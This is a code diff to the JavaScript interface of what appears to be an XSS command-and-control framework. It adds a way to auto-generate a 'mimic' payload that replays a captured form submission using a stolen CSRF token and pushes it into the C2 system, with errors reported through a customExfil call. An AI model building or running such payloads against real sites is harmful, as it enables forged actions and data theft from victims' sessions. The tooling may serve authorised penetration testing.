@@ -788,7 +788,7 @@ async function refreshSavedPayloadList()
 
 
 
-async function showCustomPayloadModal()
+async function showCustomPayloadModal(skipClear)
 {
 	var modal = new bootstrap.Modal(document.getElementById('customPayloadModal'));
 
@@ -805,9 +805,12 @@ async function showCustomPayloadModal()
 
 	var savedPayloadsList = document.getElementById('savedPayloadsList');
 
-	payloadNameInput.value   = "";
-	payloadDescription.value = "";
-	payloadCode.value        = "";
+	if (!skipClear)
+	{
+		payloadNameInput.value   = "";
+		payloadDescription.value = "";
+		payloadCode.value        = "";		
+	}
 
 
 	// Editor toggle stuff
@@ -1138,7 +1141,7 @@ async function showMimicFormModal(eventKey, formDataString)
     data.innerHTML  = '<b>Form Name:</b> ' + formName + '<br>';
     data.innerHTML += '<b>Action:</b> ' + formAction + '<br>';
     data.innerHTML += '<b>Method:</b> ' + formMethod + '<br>';
-    data.innerHTML += '<b>Encoding Type:</b> ' + formEncType + '<br>';
+    data.innerHTML += '<b>Encoding Type:</b> ' + formEncType + '<br><br>';
 
     data.innerHTML += '<b>Content:</b>' + '<br>';
 
@@ -1260,7 +1263,7 @@ async function showMimicFormModal(eventKey, formDataString)
     		payload += "		if (!csrfToken) {\n";
     		payload += "			customExfil('Error', 'Error using CSRF Token in mimic payload');\n";
      		payload += "            throw new Error('Error using CSRF Token in Mimic payload');\n";
-   		payload += "		}\n\n";
+   			payload += "		}\n\n";
 			payload += "		var bodyData = {\n";
 
 			parsedForm.forEach((item, index, array) => {
@@ -1283,7 +1286,6 @@ async function showMimicFormModal(eventKey, formDataString)
     		payload += "			headers: {\n";
     		payload += `				'Content-Type': ${formEncType},\n`;
     		payload += "			},\n";
-
 
     		// console.log("$$$$$ encType: " + formEncType);
     		if (formEncType == "'application/x-www-form-urlencoded'")
@@ -1324,10 +1326,19 @@ async function showMimicFormModal(eventKey, formDataString)
     	}
 
     	nextButton.blur();
+
+    	// Ok, now we need to push this into the C2 system
+    	var payloadNameInput   = document.getElementById('payloadName');
+		var payloadDescription = document.getElementById('payloadDescription');
+		var payloadCode        = document.getElementById('payload-editor');
+
+		payloadNameInput.value   = "Autogen mimic payload";
+		payloadDescription.value = "Automatically generated custom payload from form submission.";
+		payloadCode.value        = payload;
+
+    	modal.hide();
+    	showCustomPayloadModal(true);
     }
-
-
-
 
 	var modal = new bootstrap.Modal(document.getElementById('createFormMimicModal'));
 	modal.show();
